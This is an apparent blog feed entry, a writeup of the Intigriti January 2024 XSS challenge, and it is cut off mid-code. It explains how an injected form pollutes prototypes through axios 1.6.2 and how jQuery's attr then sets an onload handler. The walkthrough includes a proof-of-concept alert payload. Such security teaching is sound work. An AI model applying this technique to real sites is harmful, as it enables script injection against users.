<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Huli&#39;s blog</title>
  
  <subtitle>Learning by sharing</subtitle>
  <link href="https://blog.huli.tw/atom.xml" rel="self"/>
  
  <link href="https://blog.huli.tw/"/>
  <updated>2024-02-17T10:53:39.068Z</updated>
  <id>https://blog.huli.tw/</id>
  
  <author>
    <name>Huli</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  
  
  <entry>
    <title>Intigriti 0124 XSS Writeup</title>
    <link href="https://blog.huli.tw/2024/02/17/en/intigriti-0124-writeup/"/>
    <id>https://blog.huli.tw/2024/02/17/en/intigriti-0124-writeup/</id>
    <published>2024-02-17T04:40:00.000Z</published>
    <updated>2024-02-17T11:16:16.949Z</updated>
    
    <content type="html"><![CDATA[<p>Last month’s (January 2024) Intigriti challenge was very interesting, made by <a href="https://twitter.com/kevin_mizu">@kevin_mizu</a>. I have often seen him post client-side related challenges on Twitter before, and this time the quality of the challenge was as good as ever, worth documenting.</p><p>The challenge link is here, if you haven’t seen it yet, you can take a look: <a href="https://challenge-0124.intigriti.io/">https://challenge-0124.intigriti.io/</a></p><span id="more"></span><h2><span id="easier-than-expected">Easier than expected?</span></h2><p>The code for the challenge is quite short. Let’s start with the frontend part, which is basically just an HTML:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/main.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Hey &lt;%- name %>,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Which repo are you looking for?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= search %><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/img/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50px<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>35%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>homepage<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/jquery-3.7.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>                    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The part <code>&lt;h2&gt;Hey &lt;%- name %&gt;</code> is the only part related to the backend, where DOMPurify is used for sanitization:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">search</span><span class="token operator">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>search    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It’s worth noting the <code>SANITIZE_DOM: false</code> here, which disables protection against DOM Clobbering. This suggests that the challenge is related to DOM Clobbering, as this setting is deliberately turned off.</p><p>The main logic of the challenge is in the <code>search</code> function:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>                <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Actually, there doesn’t seem to be any vulnerability in the above code snippet. So after reviewing it, I went to check the libraries used in the challenge, which are jQuery 3.7.1 and axios 1.6.2. Although the file names were not mentioned, it was evident from the file contents.</p><p>Upon investigation, it was found that 1.6.2 is not the latest version, and a prototype pollution vulnerability was fixed in version 1.6.4: <a href="https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e">https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</a></p><p>The commit even includes an exploit directly, great:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'should resist prototype pollution CVE'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[0]'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[1]'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'__proto__.x'</span><span class="token punctuation">,</span> <span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'constructor.prototype.y'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token function">formDataToJSON</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">foo</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token literal-property property">constructor</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">prototype</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token string">'value'</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>From the commit, it can be seen that axios has a function called <code>formDataToJSON</code> that converts FormData to JSON, and the conversion code contains a vulnerability that can be exploited through the <code>name</code> parameter for prototype pollution.</p><p>Moving back to the challenge code, there is a part that executes: <code>axios.post(&quot;/search&quot;, $(&quot;#search&quot;).get(0)</code>, so as long as we can control <code>#search</code>, we can control the parameters passed here. It can be seen from the axios source code that the form passed here will eventually be converted to FormData and passed to <code>formDataToJSON</code>.</p><p>Therefore, we can inject a <code>&lt;form&gt;</code> using the <code>name</code> to perform prototype pollution. The next step is to find a gadget, usually starting with objects.</p><p>A suspicious part of the code is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The parameter passed here is an object, and if the <code>.attr</code> function does not have specific checks, it could be affected by polluted parameters. In fact, in jQuery, the implementation of <a href="https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16">attr</a> is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">jQuery<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">attr</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">name<span class="token punctuation">,</span> value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> jQuery<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The implementation of <a href="https://github.com/jquery/jquery/blob/main/src/core/access.js#L12">access</a> is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token parameter">elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> chainable<span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>        len <span class="token operator">=</span> elems<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        bulk <span class="token operator">=</span> key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">// Sets many values</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">toType</span><span class="token punctuation">(</span> key <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        chainable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token keyword">in</span> key <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">access</span><span class="token punctuation">(</span> elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> i<span class="token punctuation">,</span> key<span class="token punctuation">[</span> i <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If the key passed is an object, it will use <code>in</code> to retrieve each key. Since <code>in</code> retrieves properties on the prototype chain, we can pollute <code>onload</code> to let jQuery set the onload attribute.</p><p>The payload is as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>search</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>__proto__.onload</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.domain)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>q</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>react-d3</span><span class="token punctuation">></span></span>&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>It may seem fine, but upon testing, an error occurs:</p><pre class="line-numbers language-none"><code class="language-none">Uncaught (in promise) TypeError: Cannot use &#39;in&#39; operator to search for &#39;set&#39; in alert(document.domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>After a while of debugging, it was found that the error originated from this section when setting the <code>attr</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token 